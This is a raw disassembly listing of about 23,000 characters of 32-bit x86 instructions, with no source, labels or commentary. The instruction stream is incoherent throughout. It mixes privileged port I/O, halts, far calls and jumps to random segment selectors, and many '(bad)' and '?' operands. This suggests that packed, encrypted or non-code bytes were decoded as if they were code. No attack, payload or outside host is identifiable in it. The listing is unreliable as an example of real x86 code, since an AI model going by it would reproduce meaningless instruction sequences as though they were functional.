  4094de:	or     BYTE PTR [edi-0x69a85ec1],bh
  4094e4:	add    al,0x14
  4094e6:	push   esi
  4094e7:	fwait
  4094e8:	std    
  4094e9:	popa   
  4094ea:	sub    eax,DWORD PTR [ebx-0x72f24d6c]
  4094f0:	xor    cl,BYTE PTR [ebx-0x7c]
  4094f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f4:	aam    0x3c
  4094f6:	fs xchg edx,eax
  4094f8:	ret    
  4094f9:	test   al,0x28
  4094fb:	mov    es,WORD PTR [edi+ecx*8]
  4094fe:	or     al,0x50
  409500:	inc    edx
  409501:	cmp    al,0x16
  409503:	aad    0xad
  409505:	cdq    
  409506:	dec    ebp
  409507:	div    BYTE PTR [edi]
  409509:	sub    BYTE PTR [ecx],0xd5
  40950c:	in     eax,dx
  40950d:	in     al,0xbb
  40950f:	pop    esp
  409510:	xor    al,0x11
  409512:	hlt    
  409513:	cmp    DWORD PTR [edi+eiz*8+0x55],ebp
  409517:	mov    esi,0x94853575
  40951c:	and    ebp,DWORD PTR [ebp-0x21]
  40951f:	adc    dl,ah
  409521:	sbb    ah,dl
  409523:	lea    ebx,[edx]
  409525:	jbe    0x409500
  409527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409528:	mov    ds:0x1ec65679,al
  40952d:	jne    0x4094ba
  40952f:	jbe    0x4094d2
  409531:	icebp  
  409532:	push   0x35
  409534:	cli    
  409535:	cdq    
  409536:	or     al,0xd6
  409538:	sbb    ax,0x69ba
  40953c:	mov    ecx,0x21ad2ffc
  409541:	sbb    DWORD PTR [edx-0x61],0xffffffd2
  409545:	call   0xd59e:0xad5d283e
  40954c:	stos   DWORD PTR es:[edi],eax
  40954d:	sbb    al,0x12
  40954f:	and    DWORD PTR [ecx-0x4df0f537],ebx
  409555:	cmp    al,0x4f
  409557:	pop    edx
  409558:	pop    ebx
  409559:	jno    0x4094df
  40955b:	mov    edi,0xf5cd1e13
  409560:	pop    ss
  409561:	pop    esp
  409562:	mov    dl,BYTE PTR [edx-0x3634c8a2]
  409568:	not    BYTE PTR [ecx+0x34]
  40956b:	jne    0x4094fe
  40956d:	add    DWORD PTR [ebp+0x307477a5],0x552f3b7a
  409577:	mov    cs,ebx
  409579:	fld    st(3)
  40957b:	pop    esp
  40957c:	xor    DWORD PTR [edx+0x47d36bfc],edi
  409582:	dec    ebp
  409583:	cmc    
  409584:	mov    esp,0x32128017
  409589:	add    BYTE PTR ds:[esi-0x4f23bec1],cl
  409590:	sbb    ecx,esp
  409592:	mov    ah,0x3e
  409594:	sar    BYTE PTR [ecx],cl
  409596:	cdq    
  409597:	daa    
  409598:	arpl   sp,dx
  40959a:	inc    eax
  40959b:	enter  0xeb44,0x15
  40959f:	mov    fs,WORD PTR [edi+edi*8-0x550708a]
  4095a6:	cld    
  4095a7:	movntq QWORD PTR [esi+0x73],mm3
  4095ab:	mov    cs,WORD PTR [ecx-0x10f97da4]
  4095b1:	mov    al,ds:0xf5b58e6f
  4095b6:	pop    esi
  4095b7:	adc    bh,BYTE PTR [eax-0x2d9d7334]
  4095bd:	clc    
  4095be:	add    al,bh
  4095c0:	pusha  
  4095c1:	stos   DWORD PTR es:[edi],eax
  4095c2:	inc    ebx
  4095c3:	shl    edx,0x1e
  4095c6:	call   0x81ccf4b9
  4095cb:	ins    BYTE PTR es:[edi],dx
  4095cc:	aas    
  4095cd:	jbe    0x409608
  4095cf:	in     eax,dx
  4095d0:	dec    esp
  4095d1:	cdq    
  4095d2:	test   eax,edx
  4095d4:	jmp    0x54d4:0xc6a71787
  4095db:	mov    ss,WORD PTR [eax]
  4095dd:	fidiv  DWORD PTR [ecx]
  4095df:	dec    eax
  4095e0:	in     eax,dx
  4095e1:	ret    
  4095e2:	mov    dl,0xc3
  4095e4:	shr    BYTE PTR [edx+0x20],cl
  4095e7:	mov    ebx,0xa276a1c4
  4095ec:	push   esp
  4095ed:	rcr    BYTE PTR [ebp-0x22],cl
  4095f0:	sar    BYTE PTR [edi-0x16673801],cl
  4095f6:	cmc    
  4095f7:	and    edx,edx
  4095f9:	jne    0x409642
  4095fb:	bound  ebx,QWORD PTR [esi]
  4095fd:	dec    ebx
  4095fe:	jno    0x4095e9
  409600:	xchg   BYTE PTR [ecx],dl
  409602:	push   0xd8c9c135
  409607:	jge    0x4095a9
  409609:	add    eax,DWORD PTR [ebp-0x39ead5fd]
  40960f:	cmovs  esi,DWORD PTR [eax+0x20]
  409613:	sbb    DWORD PTR ds:0xf9984802,0xffffffce
  40961a:	retf   0x8762
  40961d:	nop
  40961e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40961f:	mov    esi,0x8b85392f
  409624:	cs pop eax
  409626:	inc    edx
  409627:	cmc    
  409628:	mov    ebp,0xa75d16ea
  40962d:	adc    DWORD PTR [esi+0x29],ebx
  409630:	fld    QWORD PTR [ebx+0x4a4dd6d8]
  409636:	test   BYTE PTR [eax],bl
  409638:	ds (bad) 
  40963a:	pusha  
  40963b:	lods   al,BYTE PTR ds:[esi]
  40963c:	ror    BYTE PTR [ecx+0x6d058e13],0xbd
  409643:	inc    ebx
  409644:	nop
  409645:	mov    ah,0xdc
  409647:	dec    ebp
  409648:	test   eax,0xd5370cb7
  40964d:	fs add al,0xc3
  409650:	into   
  409651:	test   eax,0x722d8e10
  409656:	popf   
  409657:	xor    bl,BYTE PTR [edx-0x2f0c5c3e]
  40965d:	jbe    0x409624
  40965f:	in     eax,0x9f
  409661:	rcl    ebx,1
  409663:	fsubr  DWORD PTR [ecx+0x178e593c]
  409669:	popa   
  40966a:	inc    ebp
  40966b:	repnz add dh,BYTE PTR [edx]
  40966e:	xor    esi,0xffffff8e
  409671:	or     eax,DWORD PTR [edi+ecx*8+0x15cadb4f]
  409678:	rol    DWORD PTR [ebx],1
  40967a:	dec    esi
  40967b:	mov    ?,WORD PTR [edx+0x4d]
  40967e:	lock mov ebx,DWORD PTR [ebx-0x2d1a0cdf]
  409685:	out    0xb2,eax
  409687:	dec    edx
  409688:	jns    0x4096dd
  40968a:	rcr    BYTE PTR [eax-0x73d19080],1
  409690:	jmp    0x9b9a32e5
  409695:	xchg   eax,esp
  409697:	loop   0x409689
  409699:	or     BYTE PTR [eax-0x32ea3b9],0x29
  4096a0:	push   ds
  4096a1:	adc    DWORD PTR [ecx+0x31],edi
  4096a4:	adc    eax,0xdde12b9c
  4096a9:	loop   0x409630
  4096ab:	add    al,0xb9
  4096ad:	ror    DWORD PTR [esi+0x3433b8b7],1
  4096b3:	test   al,0xd9
  4096b5:	(bad)  
  4096b6:	or     eax,0xac2252b3
  4096bb:	or     al,0xed
  4096bd:	in     al,dx
  4096be:	mov    esi,0x85baa4d0
  4096c3:	mov    edx,0xf86b3f01
  4096c8:	fcmovu st,st(1)
  4096ca:	adc    bl,BYTE PTR [eax-0x59808082]
  4096d0:	xor    ch,BYTE PTR [ebp-0x22]
  4096d3:	sub    ebx,0xd2105652
  4096d9:	push   eax
  4096da:	popa   
  4096db:	in     al,dx
  4096dc:	xchg   ebx,eax
  4096dd:	pop    eax
  4096de:	jmp    0x4096e2
  4096e0:	sub    al,0x1d
  4096e2:	sub    eax,0x88e8e152
  4096e7:	outs   dx,BYTE PTR ds:[esi]
  4096e8:	mov    ecx,0xb2852e18
  4096ed:	arpl   WORD PTR [edx+eax*4+0x69935c92],ax
  4096f4:	jle    0x40970d
  4096f6:	xchg   ebx,eax
  4096f7:	xchg   edi,eax
  4096f8:	xchg   ebp,eax
  4096f9:	or     DWORD PTR [esi*2+0xf68d17a],esi
  409700:	stos   BYTE PTR es:[edi],al
  409701:	xchg   ecx,eax
  409702:	mov    bl,0x5f
  409704:	ds sti 
  409706:	cld    
  409707:	lods   al,BYTE PTR ds:[esi]
  409708:	pop    ebx
  409709:	sbb    BYTE PTR [ebx],dh
  40970b:	or     eax,0x82145fa5
  409710:	push   cs
  409711:	popa   
  409712:	mov    WORD PTR [esi-0x6e8849ab],cs
  409718:	ja     0x4096a4
  40971a:	sub    al,0xca
  40971c:	sar    cl,cl
  40971e:	jb     0x4096cc
  409720:	add    DWORD PTR [edi+0x74],0xf91f45d4
  409727:	lds    edi,FWORD PTR [eax+esi*2+0x64]
  40972b:	pop    esp
  40972c:	and    eax,DWORD PTR [ebx+0x44]
  40972f:	fwait
  409730:	aas    
  409731:	arpl   WORD PTR [ebx+ebx*1+0x1a4c8fb6],ax
  409738:	lods   eax,DWORD PTR ds:[esi]
  409739:	jge    0x409785
  40973b:	popa   
  40973c:	push   esp
  40973d:	add    eax,0x1e44b6b7
  409742:	loope  0x409793
  409744:	sub    bl,0x70
  409747:	xchg   edx,edx
  409749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40974a:	in     eax,0xa
  40974c:	sbb    BYTE PTR [ebx+0x1e74275a],cl
  409752:	inc    DWORD PTR [esi-0x3dc7c479]
  409758:	call   0xef56:0xb04d8587
  40975f:	add    al,0x7c
  409761:	jns    0x409767
  409763:	pop    DWORD PTR [edi]
  409765:	fbstp  TBYTE PTR [eax+0xe]
  409768:	ret    
  409769:	mov    ebp,0xeb8cd058
  40976e:	test   BYTE PTR [ebx],bl
  409770:	or     dh,cl
  409772:	dec    ecx
  409773:	call   DWORD PTR [edx]
  409775:	add    dh,BYTE PTR [eax]
  409777:	retf   0x38f4
  40977a:	outs   dx,BYTE PTR ds:[esi]
  40977b:	xchg   BYTE PTR [ecx-0x689631b4],ch
  409781:	adc    DWORD PTR [edx],ebp
  409783:	adc    DWORD PTR [edx],ebp
  409785:	jae    0x40970c
  409787:	cs nop ebx
  40978b:	hlt    
  40978c:	push   ecx
  40978d:	and    DWORD PTR [ebp+0x5d],ebx
  409790:	ins    DWORD PTR es:[edi],dx
  409791:	push   ds
  409792:	push   0xffffffa9
  409794:	jae    0x409758
  409796:	sbb    DWORD PTR [edi+eax*1],0x7
  40979a:	test   DWORD PTR [eax],ecx
  40979c:	test   eax,0xc434f5ab
  4097a1:	push   0x12d59781
  4097a6:	call   0x108b5faa
  4097ab:	into   
  4097ac:	leave  
  4097ad:	ret    
  4097ae:	and    ebp,ebp
  4097b0:	loope  0x409762
  4097b2:	cmc    
  4097b3:	push   cs
  4097b4:	imul   eax,DWORD PTR [esi-0x56eb743e],0x77bf5ed6
  4097be:	cmp    dl,BYTE PTR [edx-0x23e5687b]
  4097c4:	call   0x846e:0x30705de8
  4097cb:	in     eax,dx
  4097cc:	jno    0x4097e9
  4097ce:	adc    DWORD PTR [ebx+0x618c5a76],edx
  4097d4:	add    edx,DWORD PTR [ecx]
  4097d6:	mov    cs,WORD PTR [edx]
  4097d8:	call   0x857f:0x68e53e0f
  4097df:	push   0x5e
  4097e1:	into   
  4097e2:	int3   
  4097e3:	push   cs
  4097e4:	sti    
  4097e5:	sti    
  4097e6:	inc    ecx
  4097e7:	fld    DWORD PTR [edx+0x1e]
  4097ea:	xor    bh,BYTE PTR [edi]
  4097ec:	jl     0x4097dc
  4097ee:	xchg   ebp,eax
  4097ef:	or     eax,0x4eef63c0
  4097f4:	shr    DWORD PTR [ecx],0x45
  4097f7:	mov    ah,0x61
  4097f9:	cld    
  4097fa:	aam    0x8
  4097fc:	inc    edi
  4097fd:	pop    ss
  4097fe:	pop    edi
  4097ff:	in     al,0x4d
  409801:	mov    bh,0x85
  409803:	dec    ebp
  409804:	repnz out 0xd5,eax
  409807:	jae    0x4097f4
  409809:	mov    edx,0x948f11c2
  40980e:	xor    BYTE PTR [edx-0x7df27c2e],al
  409814:	addr16 push cs
  409816:	out    dx,al
  409817:	mov    gs,WORD PTR [eax+0x38d8f6d2]
  40981d:	xchg   ebp,eax
  40981e:	sbb    DWORD PTR [edx+0x61815ed2],ebp
  409824:	add    edx,DWORD PTR [eax-0x76]
  409827:	pop    edi
  409828:	cmp    al,0x11
  40982a:	sbb    al,0x41
  40982c:	mov    al,ds:0x9f6f1a52
  409831:	out    0x85,eax
  409833:	test   DWORD PTR [eax+0x6eb295c3],edx
  409839:	mov    eax,0x787b8e79
  40983e:	jmp    0xe39cf108
  409843:	mov    ebx,0x4136dda9
  409848:	or     esp,DWORD PTR [esi]
  40984a:	aad    0xf4
  40984c:	dec    edi
  40984d:	cmp    BYTE PTR [ecx+0x69],ah
  409850:	fcom   DWORD PTR [ecx]
  409852:	aas    
  409853:	call   0xbe05e95c
  409858:	stc    
  409859:	sbb    al,BYTE PTR [edi+edx*2+0x2c757737]
  409860:	xor    dh,BYTE PTR [ecx-0x3a]
  409863:	jbe    0x40982a
  409865:	adc    DWORD PTR [ebx-0xbef86bf],esi
  40986b:	out    0x57,al
  40986d:	sub    eax,0xf0530285
  409872:	cmp    edx,edx
  409874:	xor    eax,0xbe8e6754
  409879:	push   ecx
  40987a:	dec    edi
  40987b:	inc    ecx
  40987c:	sahf   
  40987d:	jg     0x40985b
  40987f:	loope  0x409853
  409881:	out    dx,al
  409882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409883:	sub    al,0xf4
  409885:	pop    edx
  409886:	ret    0x321e
  409889:	adc    DWORD PTR [ebp+0x54fec4d],ecx
  40988f:	xchg   BYTE PTR [eax-0x2c],bl
  409892:	out    dx,eax
  409893:	popa   
  409894:	pop    ecx
  409895:	push   0x90c38ecd
  40989a:	pushf  
  40989b:	lock pop esp
  40989d:	fcmovnu st,st(5)
  40989f:	and    edx,DWORD PTR es:[ecx]
  4098a2:	or     bl,bh
  4098a4:	and    DWORD PTR [ecx+0x78c9c865],esp
  4098aa:	test   bl,dl
  4098ac:	inc    ebp
  4098ad:	sub    ebx,DWORD PTR [si-0x49d3]
  4098b2:	addr16 lahf 
  4098b4:	mov    WORD PTR [esi],ss
  4098b6:	jne    0x409849
  4098b8:	ror    BYTE PTR [ebx],cl
  4098ba:	mov    DWORD PTR [ecx-0x31ea321e],esi
  4098c0:	shl    BYTE PTR [edi-0x2b],cl
  4098c3:	clc    
  4098c4:	je     0x40992b
  4098c6:	add    esi,DWORD PTR [edx-0x4f]
  4098c9:	adc    DWORD PTR [edx],ecx
  4098cb:	xchg   ecx,eax
  4098cc:	jno    0x4098c6
  4098ce:	push   eax
  4098cf:	xor    eax,0x52859bf3
  4098d4:	cwde   
  4098d5:	xchg   esp,eax
  4098d6:	jnp    0x40993a
  4098d8:	sbb    al,0x10
  4098da:	fnstenv [edx-0x54c4d783]
  4098e0:	test   eax,0x639551d6
  4098e5:	pop    esi
  4098e6:	cmp    BYTE PTR [ebx+0x9845be9],ch
  4098ec:	ins    BYTE PTR es:[edi],dx
  4098ed:	xor    BYTE PTR [ecx],dl
  4098ef:	sub    al,0xd5
  4098f1:	lock xchg edi,eax
  4098f3:	mov    fs,WORD PTR [edx]
  4098f5:	mov    dh,0xa9
  4098f7:	adc    ah,BYTE PTR [edi]
  4098f9:	(bad)  
  4098fa:	pusha  
  4098fb:	and    ebx,eax
  4098fd:	xor    ch,BYTE PTR [edi+0x233dd252]
  409903:	pop    ecx
  409904:	inc    esi
  409905:	imul   esi,DWORD PTR [edi+0x750db28d],0xffffffbc
  40990c:	pop    es
  40990d:	jbe    0x409904
  40990f:	ret    
  409910:	dec    edx
  409911:	shl    esp,1
  409913:	add    eax,0x366d1bd2
  409918:	bound  ebp,QWORD PTR [edi+0x34]
  40991b:	pop    ebx
  40991c:	or     dl,BYTE PTR [eax]
  40991e:	cs mov dl,0xa1
  409921:	lahf   
  409922:	stc    
  409923:	add    edx,edx
  409925:	repz ss (bad) 
  409928:	dec    eax
  409929:	aad    0xe1
  40992b:	add    bh,cl
  40992d:	adc    esp,ebx
  40992f:	sub    ebp,DWORD PTR [edx+ebx*8]
  409932:	mov    DWORD PTR [edi+edi*1-0x282bd799],ecx
  409939:	loop   0x4098c0
  40993b:	or     esp,DWORD PTR [esi]
  40993d:	pushf  
  40993e:	loop   0x4098fd
  409940:	fucomip st,st(7)
  409942:	mov    ebx,0x2dfe858e
  409947:	dec    esp
  409948:	cdq    
  409949:	stos   BYTE PTR es:[edi],al
  40994a:	ss xchg ecx,eax
  40994c:	lods   eax,DWORD PTR ds:[esi]
  40994d:	int    0xab
  40994f:	aaa    
  409950:	iret   
  409951:	sub    ebp,ebx
  409953:	loop   0x4098e8
  409955:	xor    al,0x4f
  409957:	add    al,0x32
  409959:	and    esi,DWORD PTR ds:0xd4905d8d
  40995f:	mov    DWORD PTR [esi-0x56],0xcda9d4f5
  409966:	(bad)  
  409967:	cmp    ebx,DWORD PTR [ebx]
  409969:	(bad)  
  40996a:	push   ebp
  40996b:	stos   DWORD PTR es:[edi],eax
  40996c:	add    eax,edx
  40996e:	fstp   QWORD PTR [ebx-0x4e8b5410]
  409974:	rol    BYTE PTR [esp+ecx*2],cl
  409977:	test   eax,0xe5ecb2d3
  40997c:	jmp    0x2b97:0x418c89c3
  409983:	aas    
  409984:	std    
  409985:	shr    DWORD PTR [eax-0x57ee07a0],1
  40998b:	fistp  QWORD PTR [ebx]
  40998d:	sbb    BYTE PTR [ebp-0x7aeeabb6],cl
  409993:	push   edi
  409994:	mov    ebx,0xb2718a7c
  409999:	std    
  40999a:	or     BYTE PTR [esi-0xf01c693],cl
  4099a0:	sbb    esp,DWORD PTR [ebp+ebp*8+0x60]
  4099a4:	push   ss
  4099a5:	push   0xd03c8eaa
  4099aa:	(bad)  
  4099ab:	hlt    
  4099ac:	gs in  al,0xfa
  4099af:	mov    ds,WORD PTR [eax+0xb6b6b75]
  4099b5:	push   esp
  4099b6:	add    ah,bl
  4099b8:	rcl    ch,cl
  4099ba:	int3   
  4099bb:	mov    al,0x2c
  4099bd:	ret    0xe1b1
  4099c0:	mov    al,0x11
  4099c2:	aad    0x70
  4099c4:	in     al,0x8b
  4099c6:	mov    ch,0x57
  4099c8:	shl    DWORD PTR [esi-0x6d],0xc6
  4099cc:	test   BYTE PTR [ecx-0x14438af3],dl
  4099d2:	xlat   BYTE PTR ds:[ebx]
  4099d3:	dec    esi
  4099d4:	lds    ebx,FWORD PTR [ecx]
  4099d6:	push   edi
  4099d7:	mov    ebp,0x42063da9
  4099dc:	shl    DWORD PTR [edi],0xcb
  4099df:	sbb    dl,BYTE PTR [edx+0x39]
  4099e2:	xchg   BYTE PTR [eax-0x71f73e4f],ah
  4099e8:	lds    edx,FWORD PTR [edx+0x17]
  4099eb:	sub    BYTE PTR [esi-0x2c689239],bl
  4099f1:	ror    DWORD PTR [esi+edx*2-0x7684028f],1
  4099f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099f9:	jge    0x409a0c
  4099fb:	mov    ?,WORD PTR [esi]
  4099fd:	jnp    0x409a1f
  4099ff:	call   0x86d2:0xc95c8d28
  409a06:	ret    0x860f
  409a09:	xor    ecx,DWORD PTR [edx-0x39eee044]
  409a0f:	out    dx,eax
  409a10:	pop    esp
  409a11:	push   edx
  409a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a13:	mov    dh,0xdb
  409a15:	cli    
  409a16:	sar    edi,cl
  409a18:	sar    cl,cl
  409a1a:	aas    
  409a1b:	popa   
  409a1c:	repz pop esi
  409a1e:	or     ah,BYTE PTR [ecx]
  409a20:	jge    0x409a40
  409a22:	mov    eax,0x3a27a7d7
  409a27:	mov    ch,0xc2
  409a29:	cli    
  409a2a:	xchg   edx,eax
  409a2b:	fcmovnu st,st(7)
  409a2d:	xchg   ecx,eax
  409a2e:	pop    eax
  409a2f:	ror    DWORD PTR [ebx],cl
  409a31:	or     al,0xd7
  409a33:	in     eax,0x67
  409a35:	add    esp,edi
  409a37:	fwait
  409a38:	in     eax,dx
  409a39:	rol    DWORD PTR [edx+0x7e],1
  409a3c:	adc    al,0x63
  409a3e:	inc    esp
  409a3f:	std    
  409a40:	rol    BYTE PTR [ebx-0x8],cl
  409a43:	pop    ebx
  409a44:	int3   
  409a45:	enter  0xb5ad,0xc8
  409a49:	adc    eax,ebx
  409a4b:	inc    esi
  409a4c:	and    ecx,ebp
  409a4e:	loopne 0x409a78
  409a50:	ds and eax,0xcd40df84
  409a56:	sub    DWORD PTR [ebx-0x5bc46be],ecx
  409a5c:	dec    ecx
  409a5d:	add    dh,dh
  409a5f:	sub    eax,0xdabe119b
  409a64:	shl    DWORD PTR [ebx-0x1b52d518],0xa5
  409a6b:	pop    esp
  409a6c:	clc    
  409a6d:	inc    esp
  409a6e:	mov    esi,0xb04207bd
  409a73:	or     eax,0x805317aa
  409a78:	fild   DWORD PTR [ebx-0x2c0b5936]
  409a7e:	fld    st(6)
  409a80:	inc    edx
  409a81:	cmp    DWORD PTR [ebp+0x4a87cabb],eax
  409a87:	in     eax,dx
  409a88:	scas   al,BYTE PTR es:[edi]
  409a89:	or     BYTE PTR [eax-0x72],bl
  409a8c:	lods   eax,DWORD PTR ds:[esi]
  409a8d:	pop    ebp
  409a8e:	into   
  409a8f:	daa    
  409a90:	data16 sbb al,0xe7
  409a93:	push   ecx
  409a94:	rcl    BYTE PTR [edi+0x1ef62f80],cl
  409a9a:	inc    edi
  409a9b:	into   
  409a9c:	xchg   esp,eax
  409a9d:	adc    DWORD PTR [ecx-0x3730d521],edx
  409aa3:	dec    esp
  409aa4:	(bad)  
  409aa5:	fld    QWORD PTR [ebp+0x55aa9723]
  409aab:	inc    edx
  409aac:	mov    edi,0x6393f273
  409ab1:	cmp    ebx,0xd5331f4
  409ab7:	xchg   ebx,eax
  409ab8:	dec    edx
  409ab9:	dec    esi
  409aba:	faddp  st(3),st
  409abc:	shl    edx,cl
  409abe:	adc    al,0x8f
  409ac0:	dec    eax
  409ac1:	retf   0x61e3
  409ac4:	outs   dx,BYTE PTR ds:[esi]
  409ac5:	out    dx,al
  409ac6:	dec    eax
  409ac7:	mov    es,WORD PTR [eax]
  409ac9:	cmp    ch,BYTE PTR [ebx-0x38f3f27b]
  409acf:	adc    dl,dl
  409ad1:	jbe    0x409b08
  409ad3:	jno    0x409b1e
  409ad5:	gs (bad) 
  409ad8:	adc    BYTE PTR [ecx],dl
  409ada:	fcom   DWORD PTR [ecx]
  409adc:	sbb    BYTE PTR [esi+0x3f],0x64
  409ae0:	mov    WORD PTR [ebx],?
  409ae2:	mov    dl,BYTE PTR [eax+0x2b483d37]
  409ae8:	or     eax,0x2e2ca5f5
  409aed:	es mov ecx,0x47ce638
  409af3:	cli    
  409af4:	lahf   
  409af5:	mov    esi,0xbfd47228
  409afa:	test   DWORD PTR [ebx+0x5254de20],ebx
  409b00:	jbe    0x409b47
  409b02:	mov    ch,0x8e
  409b04:	aaa    
  409b05:	pop    esp
  409b06:	inc    ecx
  409b07:	dec    esi
  409b08:	jo     0x409ab3
  409b0a:	in     eax,dx
  409b0b:	rcl    cl,cl
  409b0d:	leave  
  409b0e:	rol    BYTE PTR ds:0x2725d18e,0x2d
  409b15:	hlt    
  409b16:	sti    
  409b17:	aad    0x2
  409b19:	ror    DWORD PTR [edx],cl
  409b1b:	inc    esi
  409b1c:	dec    esi
  409b1d:	and    eax,0xfc1bf28f
  409b22:	(bad)  
  409b23:	mov    esp,0x93d39661
  409b28:	jno    0x409b7c
  409b2a:	imul   ebx,DWORD PTR [esi],0xffffffa5
  409b2d:	push   ebx
  409b2e:	cmc    
  409b2f:	xchg   edi,eax
  409b30:	(bad)  
  409b31:	out    dx,al
  409b32:	sub    eax,0x867e2e2b
  409b37:	xlat   BYTE PTR ds:[ebx]
  409b38:	popf   
  409b39:	sub    ah,bh
  409b3b:	out    0x54,eax
  409b3d:	cmp    edi,edi
  409b3f:	mov    eax,0x29b27e5c
  409b44:	push   cs
  409b45:	xchg   ecx,eax
  409b46:	out    dx,eax
  409b47:	gs jl  0x409b68
  409b4a:	das    
  409b4b:	scas   eax,DWORD PTR es:[edi]
  409b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4d:	push   0xffffffe1
  409b4f:	pop    esp
  409b50:	jmp    0x409b07
  409b52:	dec    ebp
  409b53:	jns    0x409b1c
  409b55:	cmp    BYTE PTR [edi-0x54],al
  409b58:	rol    BYTE PTR [edi-0x1a],cl
  409b5b:	ds in  al,dx
  409b5d:	sahf   
  409b5e:	xchg   ebx,eax
  409b5f:	xchg   edi,eax
  409b60:	cmc    
  409b61:	push   ecx
  409b62:	retf   
  409b63:	or     al,0x2e
  409b65:	xor    al,0x85
  409b67:	or     al,BYTE PTR [esi-0x2d7360a5]
  409b6d:	push   es
  409b6e:	leave  
  409b6f:	ret    
  409b70:	imul   ebp,DWORD PTR [eax+0x1e5b058e],0xffffffd0
  409b77:	and    esp,DWORD PTR [ebp+ebp*8+0x69a912fe]
  409b7e:	mov    edi,DWORD PTR [edi-0x14]
  409b81:	mov    ah,0xd5
  409b83:	adc    al,0x2f
  409b85:	mov    edi,0x2ca21e33
  409b8a:	lods   eax,DWORD PTR ds:[esi]
  409b8b:	in     eax,dx
  409b8c:	and    bh,BYTE PTR [eax]
  409b8e:	repnz mov es,WORD PTR [ecx+0x38]
  409b92:	mov    dh,0x78
  409b94:	ret    
  409b95:	lock outs dx,DWORD PTR ds:[esi]
  409b97:	(bad)  
  409b99:	or     al,0xd1
  409b9b:	pop    esp
  409b9c:	sbb    al,0x32
  409b9e:	stc    
  409b9f:	aaa    
  409ba0:	outs   dx,DWORD PTR ds:[esi]
  409ba1:	mov    fs,WORD PTR [esi-0x18ee4002]
  409ba7:	ss pop ax
  409baa:	popa   
  409bab:	in     eax,0x77
  409bad:	rol    DWORD PTR [ebp-0x300de213],1
  409bb3:	add    BYTE PTR [esp+ecx*2-0xa],cl
  409bb7:	lea    edx,[ebx-0x9a92d27]
  409bbd:	or     al,0x6f
  409bbf:	cli    
  409bc0:	lods   eax,DWORD PTR ds:[esi]
  409bc1:	sub    al,0x85
  409bc3:	out    0xfd,eax
  409bc5:	retf   
  409bc6:	and    al,0x4f
  409bc8:	daa    
  409bc9:	das    
  409bca:	daa    
  409bcb:	arpl   WORD PTR [ecx],si
  409bcd:	aad    0xb1
  409bcf:	or     dl,dl
  409bd1:	mov    cl,BYTE PTR [edx]
  409bd3:	imul   eax,DWORD PTR [ecx-0x2cfa4a5a],0x3b
  409bda:	add    DWORD PTR [eax+0x737f1c11],esi
  409be0:	mov    esi,0xe189b73e
  409be5:	std    
  409be6:	sub    BYTE PTR [ebx],dl
  409be8:	mov    ds:0xb28be570,eax
  409bed:	add    ebx,DWORD PTR [ebx-0x22ea2d9d]
  409bf3:	sbb    BYTE PTR [edx],0xeb
  409bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bf7:	push   ecx
  409bf8:	add    BYTE PTR [ecx],dl
  409bfa:	std    
  409bfb:	mov    bh,0x9e
  409bfd:	in     al,0x18
  409bff:	aam    0x71
  409c01:	pop    esi
  409c02:	test   BYTE PTR [esi+0x43],bl
  409c05:	stos   DWORD PTR es:[edi],eax
  409c06:	adc    BYTE PTR [ecx-0x29],ch
  409c09:	push   eax
  409c0a:	adc    BYTE PTR [ebp+0x16db37af],cl
  409c10:	mov    ch,0x88
  409c12:	fwait
  409c13:	into   
  409c14:	add    al,0x87
  409c16:	test   cl,bh
  409c18:	add    al,BYTE PTR [ecx]
  409c1a:	test   al,0x50
  409c1c:	adc    al,ch
  409c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c1f:	shl    DWORD PTR [edi+0x1e],1
  409c22:	popa   
  409c23:	(bad)  
  409c24:	imul   esp,DWORD PTR [ecx],0x9440212
  409c2a:	test   BYTE PTR [ebx+0x629ee021],dl
  409c30:	loop   0x409ca4
  409c32:	mov    cs,WORD PTR [esi+0x58036bf0]
  409c38:	shl    BYTE PTR [edi-0x202e8dac],0xb0
  409c3f:	dec    eax
  409c40:	ficom  WORD PTR [ecx+0x7b]
  409c43:	pop    esp
  409c44:	add    cl,BYTE PTR [ebp-0x2efe717f]
  409c4a:	pop    DWORD PTR [esi]
  409c4c:	js     0x409c62
  409c4e:	arpl   WORD PTR [edx+edx*8],ax
  409c51:	add    ch,BYTE PTR [ebx+0x46]
  409c54:	xlat   BYTE PTR ds:[ebx]
  409c55:	jno    0x409c91
  409c57:	xchg   DWORD PTR [edx],ebp
  409c59:	adc    DWORD PTR [ebx-0x40129857],esi
  409c5f:	aam    0xac
  409c61:	fiadd  DWORD PTR [ebp+0x75392c70]
  409c67:	lods   eax,DWORD PTR ds:[esi]
  409c68:	leave  
  409c69:	sub    ebp,edi
  409c6b:	mov    es,esp
  409c6d:	mov    ds:0xb268424a,eax
  409c72:	in     al,dx
  409c73:	fadd   st(0),st
  409c75:	enter  0xdeba,0x52
  409c79:	in     al,0xe6
  409c7b:	xor    al,BYTE PTR [ecx+0x50]
  409c7e:	pop    edi
  409c7f:	faddp  st(6),st
  409c81:	and    eax,0x52522ad8
  409c86:	sbb    BYTE PTR [ecx+0x6a64583a],bl
  409c8c:	add    dh,BYTE PTR [edx]
  409c8e:	add    edi,ecx
  409c90:	fstp   DWORD PTR [esi-0x4c]
  409c93:	cwde   
  409c94:	(bad)  
  409c95:	sar    DWORD PTR [edi+0x317e43a2],1
  409c9b:	cmp    eax,0x8ea1d8ae
  409ca0:	stos   DWORD PTR es:[edi],eax
  409ca1:	sbb    al,0x1d
  409ca3:	jb     0x409d07
  409ca5:	xchg   esi,eax
  409ca6:	jns    0x409cf0
  409ca8:	and    eax,0xa9585a3
  409cad:	mov    ebp,0xdb3e0fe2
  409cb2:	add    al,0x8e
  409cb4:	test   al,0xc9
  409cb6:	nop
  409cb7:	fs inc eax
  409cb9:	es popa 
  409cbb:	push   ebx
  409cbc:	rcl    BYTE PTR ds:0x7b028bbd,cl
  409cc2:	ret    0x5a4b
  409cc5:	push   ds
  409cc6:	ins    BYTE PTR es:[edi],dx
  409cc7:	out    0xee,al
